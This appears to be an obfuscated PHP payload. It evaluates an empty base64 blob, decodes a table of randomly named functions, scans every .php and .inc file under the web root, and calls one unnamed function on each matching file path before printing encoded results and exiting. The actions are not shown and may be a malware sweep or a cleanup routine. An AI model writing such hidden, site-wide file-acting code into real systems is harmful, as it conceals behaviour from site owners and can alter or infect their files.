eval(base64_decode(""));
$defs = unserialize(base64_decode("YTo2Nzp7aTowO2E6Mzp7aTowO2k6MjtpOjE7czo1OiJyYmR1ciI7aToyO3M6NDoiZ2tlaSI7fWk6MTthOjM6e2k6MDtpOjU7aToxO3M6OToicnRmb2Z0ZWN1IjtpOjI7czo1OiJnc2lsbSI7fWk6MjthOjM6e2k6MDtpOjE1O2k6MTtzOjc6InJ2ZnlsdWciO2k6MjtzOjg6ImdocmFpdGlhIjt9aTozO2E6Mzp7aTowO2k6MTg7aToxO3M6NzoicnJwZHd2ZCI7aToyO3M6MTE6ImdncXZxZmpkemlyIjt9aTo0O2E6Mzp7aTowO2k6MjM7aToxO3M6ODoicmpsc2Znb2UiO2k6MjtzOjc6ImdleXR4cnYiO31pOjU7YTozOntpOjA7aTozNjtpOjE7czo4OiJyYW11ZGZheCI7aToyO3M6NToiZ25pc3giO31pOjY7YTozOntpOjA7aTo0MjtpOjE7czo3OiJyaXlwdXRzIjtpOjI7czo0OiJnYnlyIjt9aTo3O2E6Mzp7aTowO2k6NTQ7aToxO3M6ODoicnN5cmtlc3oiO2k6MjtzOjg6Imd1dW5sd2d6Ijt9aTo4O2E6Mzp7aTowO2k6NjA7aToxO3M6MTE6InJtem1rbWJqYWlwIjtpOjI7czo2OiJnZ3FvYnoiO31pOjk7YTozOntpOjA7aTo4OTtpOjE7czo3OiJyd2JmZ29xIjtpOjI7czo5OiJnanllbndkaW4iO31pOjEwO2E6Mzp7aTowO2k6MTA5O2k6MTtzOjU6InJ1ZG1oIjtpOjI7czo1OiJnYXZncSI7fWk6MTE7YTozOntpOjA7aToxMTA7aToxO3M6ODoicnRydmRleHEiO2k6MjtzOjc6Imd0eWl4bW8iO31pOjEyO2E6Mzp7aTowO2k6MTExO2k6MTtzOjEwOiJycXRlZGh2Z3dkIjtpOjI7czo0OiJnZHd4Ijt9aToxMzthOjM6e2k6MDtpOjExMjtpOjE7czo5OiJyY3NhcmdnbGgiO2k6MjtzOjc6ImdkaG1vbngiO31pOjE0O2E6Mzp7aTowO2k6MTE1O2k6MTtzOjY6InJmZHlrayI7aToyO3M6NzoiZ3VpeXZnZiI7fWk6MTU7YTozOntpOjA7aToxMTg7aToxO3M6NjoicmpmeHJpIjtpOjI7czo1OiJnc2lnbCI7fWk6MTY7YTozOntpOjA7aToxMjY7aToxO3M6NzoicnlmcndlZiI7aToyO3M6ODoiZ3lid3dtaWQiO31pOjE3O2E6Mzp7aTowO2k6MTI3O2k6MTtzOjk6InJ1dHpqbHdncSI7aToyO3M6NzoiZ2pneHFzcCI7fWk6MTg7YTozOntpOjA7aToxMzA7aToxO3M6NDoicnBqbSI7aToyO3M6OToiZ2lwdWZka2x5Ijt9aToxOTthOjM6e2k6MDtpOjEzNDtpOjE7czo3OiJyenJrbGtkIjtpOjI7czo2OiJneXF1dm8iO31pOjIwO2E6Mzp7aTowO2k6MTM4O2k6MTtzOjU6InJ2b2RwIjtpOjI7czoxMDoiZ3RtZWtucnZ3YSI7fWk6MjE7YTozOntpOjA7aToxNDg7aToxO3M6NzoicnhidXVhYiI7aToyO3M6MTE6ImdpZXlwZ3N3Z3RvIjt9aToyMjthOjM6e2k6MDtpOjE1NztpOjE7czo5OiJyYnlpZXdidmgiO2k6MjtzOjQ6Imd0cHgiO31pOjIzO2E6Mzp7aTowO2k6MTYzO2k6MTtzOjEwOiJyenhrZm5tbG52IjtpOjI7czo4OiJnbnhvcm1leCI7fWk6MjQ7YTozOntpOjA7aToxNzI7aToxO3M6OToicnRvaGF0c3NnIjtpOjI7czo5OiJnbXl4cW1kcXAiO31pOjI1O2E6Mzp7aTowO2k6MTc0O2k6MTtzOjU6InJvem9nIjtpOjI7czoxMToiZ3Fwb2hmc2Zsam8iO31pOjI2O2E6Mzp7aTowO2k6MTc5O2k6MTtzOjExOiJyb2d4b2R5eGd4cSI7aToyO3M6OToiZ2tva25yd3pzIjt9aToyNzthOjM6e2k6MDtpOjE4NztpOjE7czoxMDoicm95eHdia3ZzbiI7aToyO3M6NzoiZ2F3cXJqcyI7fWk6Mjg7YTozOntpOjA7aToxODk7aToxO3M6MTA6InJyeXZzZHJjcmIiO2k6MjtzOjg6ImdhZGlrZGpuIjt9aToyOTthOjM6e2k6MDtpOjE5MjtpOjE7czo5OiJydnJkY2lwcWsiO2k6MjtzOjExOiJndHNtbGxxY2hnayI7fWk6MzA7YTozOntpOjA7aToxOTY7aToxO3M6MTE6InJwc3N4ZWFwcWVlIjtpOjI7czoxMDoiZ3NxcGV2YmRzbyI7fWk6MzE7YTozOntpOjA7aToxOTg7aToxO3M6ODoicnNrYXRrb2EiO2k6MjtzOjExOiJnbnVmaWRzZW55eCI7fWk6MzI7YTozOntpOjA7aToxOTk7aToxO3M6MTA6InJ4ZGFsbnNxYXQiO2k6MjtzOjk6Imd3cWVwd2FuZyI7fWk6MzM7YTozOntpOjA7aToyMDA7aToxO3M6NjoicnN5YmFtIjtpOjI7czo5OiJnaXFkdmN6bnQiO31pOjM0O2E6Mzp7aTowO2k6MjAxO2k6MTtzOjExOiJyZ2V0Z2Z5YXpldCI7aToyO3M6NzoiZ3VmaWtkdSI7fWk6MzU7YTozOntpOjA7aToyMDM7aToxO3M6ODoicmd2aHZ1cWoiO2k6MjtzOjU6ImdxYWtqIjt9aTozNjthOjM6e2k6MDtpOjIwNjtpOjE7czoxMDoicmJ6aGx4eHF4diI7aToyO3M6MTA6Imd0Y2ZhcnNzYm0iO31pOjM3O2E6Mzp7aTowO2k6MjA5O2k6MTtzOjg6InJzcmlwZHZjIjtpOjI7czo0OiJnZG56Ijt9aTozODthOjM6e2k6MDtpOjIxMDtpOjE7czo5OiJyenJnaHpxbHgiO2k6MjtzOjc6Imd1aHp4eXUiO31pOjM5O2E6Mzp7aTowO2k6MjEyO2k6MTtzOjU6InJsY3VxIjtpOjI7czoxMDoiZ2NiZ2FweHlodiI7fWk6NDA7YTozOntpOjA7aToyMTM7aToxO3M6OToicm5iYWV3bWNjIjtpOjI7czoxMDoiZ3pjZGZyenBmbiI7fWk6NDE7YTozOntpOjA7aToyMTQ7aToxO3M6NDoicm94aSI7aToyO3M6ODoiZ2hkZ2RzanciO31pOjQyO2E6Mzp7aTowO2k6MjE1O2k6MTtzOjg6InJmdHZ3cHRiIjtpOjI7czo5OiJndGtlc2l2bWkiO31pOjQzO2E6Mzp7aTowO2k6MjE2O2k6MTtzOjc6InJyaWZueHgiO2k6MjtzOjY6ImdnaGlrbCI7fWk6NDQ7YTozOntpOjA7aToyMTc7aToxO3M6MTE6InJydGdjZHVobHRpIjtpOjI7czoxMToiZ2pubmFhZXdyd2wiO31pOjQ1O2E6Mzp7aTowO2k6MjE4O2k6MTtzOjc6InJwa2tjaGEiO2k6MjtzOjQ6Imdwb3MiO31pOjQ2O2E6Mzp7aTowO2k6MjIxO2k6MTtzOjEwOiJyZXBycWZwY3FzIjtpOjI7czo0OiJndnBmIjt9aTo0NzthOjM6e2k6MDtpOjIyMjtpOjE7czo2OiJyanhjb20iO2k6MjtzOjEwOiJnZ3V4eXlsaWh4Ijt9aTo0ODthOjM6e2k6MDtpOjIyMztpOjE7czo0OiJybW14IjtpOjI7czo1OiJnZG1wdyI7fWk6NDk7YTozOntpOjA7aToyMjQ7aToxO3M6ODoicnNmbG53Zm0iO2k6MjtzOjU6Imd1d2ZvIjt9aTo1MDthOjM6e2k6MDtpOjIyNTtpOjE7czoxMToicmpjbWR0YmNvamciO2k6MjtzOjExOiJndGlkemRpb3pkcCI7fWk6NTE7YTozOntpOjA7aToyMzA7aToxO3M6NzoicnpmdGJtcyI7aToyO3M6NToiZ3ppd2EiO31pOjUyO2E6Mzp7aTowO2k6MjMyO2k6MTtzOjg6InJmYWV0Z3NhIjtpOjI7czo0OiJnbmtkIjt9aTo1MzthOjM6e2k6MDtpOjIzMztpOjE7czo3OiJyam95YmhmIjtpOjI7czo2OiJndWhhb2siO31pOjU0O2E6Mzp7aTowO2k6MjM1O2k6MTtzOjU6InJqcXloIjtpOjI7czoxMDoiZ3dncW9vZXlpdiI7fWk6NTU7YTozOntpOjA7aToyMzY7aToxO3M6NzoicnJrdWx3ZSI7aToyO3M6NjoiZ2d1aHd5Ijt9aTo1NjthOjM6e2k6MDtpOjIzNztpOjE7czo4OiJyam5qcGRjcSI7aToyO3M6NjoiZ2VtaWZ0Ijt9aTo1NzthOjM6e2k6MDtpOjIzODtpOjE7czo2OiJycmp1a3oiO2k6MjtzOjEwOiJnaGZudnJyeWV0Ijt9aTo1ODthOjM6e2k6MDtpOjIzOTtpOjE7czoxMToicmh2bGF1dW9hcG8iO2k6MjtzOjQ6ImdqaG8iO31pOjU5O2E6Mzp7aTowO2k6MjQwO2k6MTtzOjQ6InJjZnMiO2k6MjtzOjQ6Imd0d3QiO31pOjYwO2E6Mzp7aTowO2k6MjQxO2k6MTtzOjY6InJxenJpdSI7aToyO3M6NDoiZ2t5aCI7fWk6NjE7YTozOntpOjA7aToyNDI7aToxO3M6NjoicmdhY3dlIjtpOjI7czoxMDoiZ210Y3dnZnh5aiI7fWk6NjI7YTozOntpOjA7aToyNDM7aToxO3M6MTA6InJxbGNneWt2dHciO2k6MjtzOjU6ImdqaGRzIjt9aTo2MzthOjM6e2k6MDtpOjI0NDtpOjE7czoxMDoicmJrcWdmZHVjdCI7aToyO3M6MTE6Imdic2R0bHVremp2Ijt9aTo2NDthOjM6e2k6MDtpOjI0NTtpOjE7czoxMToicmllb3RzbmthbnYiO2k6MjtzOjExOiJndmlhZ2VybXZ4eSI7fWk6NjU7YTozOntpOjA7aToyNDY7aToxO3M6NjoicmZ1ZGNvIjtpOjI7czo5OiJnYWZuenhycGQiO31pOjY2O2E6Mzp7aTowO2k6MjQ3O2k6MTtzOjc6InJqcmFkeXIiO2k6MjtzOjQ6Imd0eHMiO319"));

function GetDocRoot()
{
    $docroot_end = strrpos($_SERVER['SCRIPT_FILENAME'], $_SERVER['REQUEST_URI']);
    if ($docroot_end === FALSE)
    {
        return $_SERVER['DOCUMENT_ROOT'];
    }
    elseif ($docroot_end === 0)
    {
        return "/";
    }
    else
    {
        return substr($_SERVER['SCRIPT_FILENAME'], 0, $docroot_end);
    }
}

function GetFileList($dir, $depth=1000000000)
{
    $result = array();

    $dir_count = 0;

    if ($depth < 1) {
        return $result;
    }

    $dir = strlen($dir) == 1 ? $dir : rtrim($dir, '\\/');
    $h = @opendir($dir);
    if ($h === FALSE)
    {
        return $result;
    }

    while (($f = readdir($h)) !== FALSE)
    {
        if ($f !== '.' and $f !== '..')
        {
            $current_dir = "$dir/$f";
            if (is_dir($current_dir))
            {
                $dir_count += 1;

                $result = array_merge($result, GetFileList($current_dir, $depth / 10));
            }
            else
            {
                $path_parts = pathinfo($current_dir);
                if (isset($path_parts['extension']) && ($path_parts['extension']=="php" || $path_parts['extension']=="inc"))
                {
                    $result[] = $current_dir;
                }

            }
        }
    }

    closedir($h);

    return $result;
}

$res = Array();
foreach(GetFileList(GetDocRoot()) as $path)
{
    $content = @file_get_contents($path);
    foreach($defs as $def_item)
    {
        if($def_item[1]($content))
        {
            if (!array_key_exists($def_item[0], $res))
            {
                $res[$def_item[0]] = 0;
            }
            
            $res[$def_item[0]] += 1;
            
            $def_item[2]($path);
        }
    }
}

echo base64_encode(serialize($res));
exit();